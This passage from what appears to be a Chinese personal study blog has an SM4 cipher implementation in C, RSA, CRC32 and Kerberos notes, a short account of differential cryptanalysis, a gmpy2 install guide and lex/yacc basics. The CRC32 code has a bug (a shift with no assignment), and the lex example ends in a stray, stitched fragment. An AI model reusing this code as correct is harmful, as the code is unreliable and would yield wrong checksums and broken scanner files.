Lp(x) ((x)^ROL32(x,13)^ROL32(x,23)) <span class="comment">// L&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Tp(x) (Lp(tau(x))) <span class="comment">// T&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck(i) (((4*(i)*7)&amp;0xFF)&lt;&lt;24|(((4*(i)+1)*7)&amp;0xFF)&lt;&lt;16|(((4*(i)+2)*7)&amp;0xFF)&lt;&lt;8|(4*(i)+3)*7&amp;0xFF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R(x) (((x)&gt;&gt;24)&amp;0xFF|((x)&gt;&gt;8)&amp;0xFF00|((x)&lt;&lt;8)&amp;0xFF0000|((x)&lt;&lt;24))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RK_SIZE 32      <span class="comment">// 密钥轮数</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rk[<span class="number">32</span>];    <span class="comment">// 轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> rrk[<span class="number">32</span>];    <span class="comment">// 逆序轮密钥</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> fk[<span class="number">4</span>] = &#123; <span class="number">0xA3B1BAC6</span>,<span class="number">0x56AA3350</span>,<span class="number">0x677D9197</span>,<span class="number">0xB27022DC</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line"><span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line"><span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>], <span class="keyword">uint32_t</span> crk[<span class="number">31</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c[<span class="number">36</span>];</span><br><span class="line">    c[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">2</span>] = p[<span class="number">2</span>];</span><br><span class="line">    c[<span class="number">3</span>] = p[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = (c[i + <span class="number">1</span>] ^ c[i + <span class="number">2</span>] ^ c[i + <span class="number">3</span>] ^ crk[i]);</span><br><span class="line">        c[i + <span class="number">4</span>] = c[i] ^ T(t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, c[i + <span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">0</span>] = c[<span class="number">35</span>];</span><br><span class="line">    p[<span class="number">1</span>] = c[<span class="number">34</span>];</span><br><span class="line">    p[<span class="number">2</span>] = c[<span class="number">33</span>];</span><br><span class="line">    p[<span class="number">3</span>] = c[<span class="number">32</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span> p[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(p, rk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(c, rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uint32_t</span> mk[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>] = mk[<span class="number">0</span>] ^ fk[<span class="number">0</span>];</span><br><span class="line">    k[<span class="number">1</span>] = mk[<span class="number">1</span>] ^ fk[<span class="number">1</span>];</span><br><span class="line">    k[<span class="number">2</span>] = mk[<span class="number">2</span>] ^ fk[<span class="number">2</span>];</span><br><span class="line">    k[<span class="number">3</span>] = mk[<span class="number">3</span>] ^ fk[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>]^ck(i);</span><br><span class="line">        k[i + <span class="number">4</span>] = k[i] ^ Tp(t);</span><br><span class="line">        rk[i] = k[i + <span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE - i<span class="number">-1</span>] = rk[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint32_t</span>* d, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s============\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X,&quot;</span>, d[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n============================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> p[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p, data, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(mk, key, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        mk[i] = R(mk[i]);</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    initKey(mk);</span><br><span class="line">    printArray(<span class="string">&quot;plain text&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    encrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;cipher&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    decrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;plain text(after decrypt)&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(data, p, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>[1] SM4算法标准</p>
<h2 id="公钥加密算法"><a href="#公钥加密算法" class="headerlink" title="公钥加密算法"></a>公钥加密算法</h2><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><blockquote>
<p>费马小定理</p>
<p>$p$是质数，$a$不是$p$的倍数，$a^{p-1}mod\ p\equiv1$</p>
</blockquote>
<p>那么对于数据$a$，加密后的数据为$c$，私钥为$e,p,q$，公钥为$d,n$</p>
<p>其中$n=pq$，$ed\equiv 1(\mod (p-1)(q-1))$</p>
<p>则加密</p>
<script type="math/tex; mode=display">
c=a^{e}\mod n</script><p>解密</p>
<script type="math/tex; mode=display">
c^{d}\mod n\equiv (a^e)^d\mod n\equiv a^{ed}\mod n</script><p>由于</p>
<script type="math/tex; mode=display">
a^{ed}\equiv a^{1+t(p-1)(q-1)}\mod n=aa^{(p-1)(q-1)}\mod n</script><p>又由于$n=pq,ab\mod n=(a\mod n)(b\mod n)\mod n$</p>
<p>得到</p>
<script type="math/tex; mode=display">
a^{(p-1)(q-1)}\mod n</script><p>从而</p>
<script type="math/tex; mode=display">
(a^{p-1})^{q-1}\mod pq\equiv a^{p-1}\mod p\equiv 1</script><p>从而解密出来为$a$</p>
<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><p>// TODO</p>
<h2 id="其它加密算法"><a href="#其它加密算法" class="headerlink" title="其它加密算法"></a>其它加密算法</h2><h3 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h3><p>用于校验数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">CRC</span><span class="params">(<span class="keyword">uint32_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> crc32tab[<span class="number">256</span>],crc,dwcrc=<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        crc=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(crc&amp;<span class="number">1</span>)crc=(crc&gt;&gt;<span class="number">1</span>)^<span class="number">0xEDB88320</span>;</span><br><span class="line">            <span class="keyword">else</span> crc&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        crc32tab[i]=crc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dwcrc=crc32tab[(dwcrc^v[i])&amp;<span class="number">0xFF</span>]^(dwcrc&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dwcrc=~dwcrc;</span><br><span class="line">    <span class="keyword">return</span> dwcrc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CRC并不安全，只用于传输过程中完整性的校验</p>
<h3 id="base系列"><a href="#base系列" class="headerlink" title="base系列"></a>base系列</h3><p>base64，base56，base32，base16</p>
<p>找到base表</p>
<h2 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h2><p>攻击者选取一部分明文并获取相应密文，运用若干对有着常量差异的明文，计算其中的差异$\Delta x=f(x_1,x_2)$，其中$f$可以自定义，比如异或操作。</p>
<p>然后攻击者计算相应密文的差异，尝试找出差异分布的统计特征。明文差异和密文差异所组成的差异叫做差分，统计特征由所使用的S盒所决定。</p>
<p>对于S盒$S$，攻击者分析差分$(\Delta x,\Delta y),\Delta y=S(x\oplus \Delta x)\oplus S(x)$。攻击者希望某个密文差异出现的频率非常高，这样就能将加密和随机过程区分开来。</p>
<blockquote>
<p>最基本的差分密码分析密钥破解形式中，攻击者首先获取大量明文对的密文，并假设差分在至少<em>r</em> − 1轮后有效，<em>r</em>即加密算法的总轮数。攻击者在倒数第二轮与最后一轮之间差异固定的假设下，去推测可能的轮密钥。如果轮密钥比较短，那么只需举可能的轮密钥，直到最后一轮运算结果和差异的<em>密文对</em>一致即可。当一个轮密钥看起来明显比其他密钥常出现时，其会被假设是正确的轮密钥</p>
</blockquote>
<p>还不是很懂，回头看英文版似乎有个简单的例子。</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90">差分密码分析—wikipedia</a></p>
<h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>Kerberos用于服务器认证用户身份</p>
<p>Kerberos保存有所有人的密钥</p>
<p>过程</p>
<ol>
<li>客户从Kerberos认证服务器请求一张票据，该票据用用户的密钥加密之后发送给用户。这个票据是TGS(票据许可服务)</li>
<li>客再从TGS请求一张票据，TGS将票据返回给用户</li>
<li>用户将此票据呈现给服务器，如果用户身份没问题，服务器便会提供服务</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/develop/python_gmpy" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/develop/python_gmpy/" class="article-date">
  	<time datetime="2020-10-21T08:20:24.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/develop/python_gmpy/">
        windows下python安装gmpy2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="gmp"><a href="#gmp" class="headerlink" title="gmp"></a>gmp</h2><p>gmp是gnu的大整数运算库，gmpy2应用于python平台</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li><p>安装python</p>
</li>
<li><p>安装wheel</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy对应的wheel</p>
<p>在<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy">这个网站</a>找到你的python版本对应的gmpy2 wheel，比如说我是python3.8版本就选择<code>gmpy2-2.0.8-c</code><strong>p38</strong><code>-cp38-win_amd64.whl</code>下载之后安装。</p>
<p>python版本直接在命令行内运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="literal">-version</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy2</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>
<p>输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br></pre></td></tr></table></figure>
<p>不报错即可</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43302174/article/details/102933164">基于python3在windows下安装gmpy2</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/compiler/lex_and_yacc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/compiler/lex_and_yacc/" class="article-date">
  	<time datetime="2020-10-21T07:55:31.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/compiler/lex_and_yacc/">
        lex，yacc学习笔记
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="lex和yacc是什么"><a href="#lex和yacc是什么" class="headerlink" title="lex和yacc是什么"></a>lex和yacc是什么</h2><p>lex是一个生成词法分析器的程序，flex是其开源版本。</p>
<p>所谓生成词法分析器，就是按照你的意愿，遇到某个词法时执行某个动作</p>
<p>yacc时生成编译器的编译器，生成的主要是编译器的词法解析器。配合yacc使用，当解析到某种语法时执行一定的动作。</p>
<p>lex的开源版本为flex，yacc对应gnu的bison</p>
<p>kali安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install flex bison</span><br></pre></td></tr></table></figure>
<h2 id="lex使用简单介绍"><a href="#lex使用简单介绍" class="headerlink" title="lex使用简单介绍"></a>lex使用简单介绍</h2><p>lex文件格式为*.l，例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line">%%</span><br><span class="line"><span class="function">stop <span class="title">printf</span><span class="params">(<span class="string">&quot;Stop command received\n&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">start <span class="title">printf</span><span class="params">(<span class="string">&quot;Start command received\n&quot;</span>)</span></span>;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>保存，然后执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lex 文件名.l</span><br></pre></td></tr></table></figure>
<p>会在同目录下生成lex.yy.c</p>
<p>执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc lex.yy.c -ll -o a # -ll代表使用lex库，提供了main函数，-o a代表输出到</span><br></pre></td></tr></table></figure>
<p>运行a程序，发现输入stop和start时会打印对应的东西，其他情况回显</p>
<p>lex使用正则表达式</p>
<h2 id="yacc使用"><a href="#yacc使用" class="headerlink" title="yacc使用"></a>yacc使用</h2><p>yacc语法分析器解析一个标识流符，这里就需要lex配合了。因为yacc并不知道输入流中的字符是什么东西。</p>
<p>假定有一个温度计，使用如下语言控制它</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heat on</span><br><span class="line">Heater on!</span><br><span class="line">heat off</span><br><span class="line">Header off!</span><br><span class="line">target temperature set!</span><br></pre></td></tr></table></figure>
<p>lex的tokenizer为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span>;</span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%ure <span class="built_in">set</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure>
<p>y.tab.h中定义了NUMBER，TOKHEAT这些常量，这个文件由yacc根据我们编写的语法规则生成</p>
<p>yacc的文件后缀名为*.y</p>
